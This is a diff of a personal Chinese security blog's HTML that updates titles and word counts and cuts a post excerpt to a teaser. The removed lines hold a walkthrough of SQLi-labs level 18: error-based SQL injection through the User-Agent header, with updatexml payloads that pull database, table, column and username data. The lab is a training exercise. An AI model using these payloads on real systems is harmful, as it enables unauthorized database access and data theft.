@@ -125,7 +125,7 @@
 
 
 
-  <title>quan9i's blog - 小白的博客网站,一个计算机萌新</title>
+  <title>quan9i's blog - 小白博客网站</title>
   
 
 
@@ -169,7 +169,7 @@
       </a>
     </div>
       
-        <h1 class="site-subtitle" itemprop="description">小白的博客网站,一个计算机萌新</h1>
+        <h1 class="site-subtitle" itemprop="description">小白博客网站</h1>
       
   </div>
 
@@ -573,7 +573,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  421
+                  429
                 </span>
               
 
@@ -611,14 +611,14 @@
 
       
         
-          
-            <h1 id="sql-lab-18"><a href="#sql-lab-18" class="headerlink" title="sql-lab 18"></a>sql-lab 18</h1><p>观察发现执行正确时会报出user-agent和本机地址<br>错误时只报出本机地址<br><img src="https://img-blog.csdnimg.cn/669d7de52333452e867cfc86d80396f9.png" alt="在这里插入图片描述"><br>而且我们发现在unname和passwd中进行注入时发现’被转义，所以不能使用这两个来进行注入，这时候只有user -agent 有回显，所以我们可以用user-agent来进行报错注入，首先用burpsuite抓包，然后发送到repeat模块，然后将user-agent内容改为 <code>&#39;  and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;1&#39;=&#39;1</code>，点击Go运行，查看结果，报出了当前数据库security<br><img src="https://img-blog.csdnimg.cn/243c079b1b4245f4ba592c4b3aae6031.png" alt="在这里插入图片描述"><br>前面的’和后面1的’需要看情况，如果user-agent是用双引号包裹的那就需要改成双引号，遇到题时一一测试即可，关于最后为什么不用加注释符，原因是后面还要其它内容要插入，你用注释符后面就注释掉了，无法正常插入。<br>简单的理解就是user-agent执行后后面还有很多语句要执行，如果加个注释符，后面的就无法执行了（注释符：可以理解为#是把后面所有东西都注释了）</p>
-<h2 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h2><p>User-Agent:<code>&#39; and updatexml(1,concat(0x7e,(select  schema_name from information_schema.schemata limit 1,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/23443afc6dd447768e4f07293ef55147.png" alt="在这里插入图片描述"></p>
-<h2 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select  table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/e56c7af6a31e45499088ef0df827cbbd.png" alt="在这里插入图片描述"></p>
-<h2 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/a6f5e35897694418a6ebeb8787834ad5.png" alt="在这里插入图片描述"></p>
-<h2 id="查询字段信息"><a href="#查询字段信息" class="headerlink" title="查询字段信息"></a>查询字段信息</h2><p>User-Agent: <code>&#39; and updatexml(1,concat(0x7e,(select username from security.users limit 0,1),0x7e),1) or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/acc43dccb06046d5a6692d931c7c976e.png" alt="在这里插入图片描述"></p>
-
-          
+          <h1 id="sql-lab-18"><a href="#sql-lab-18" class="headerlink" title="sql-lab 18"></a>sql-lab 18</h1><p>观察题目并进行测试</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/sql-lab/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2137,7 +2137,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">10k</span>
+    <span title="Site words total count">10.1k</span>
   
 </div>
 
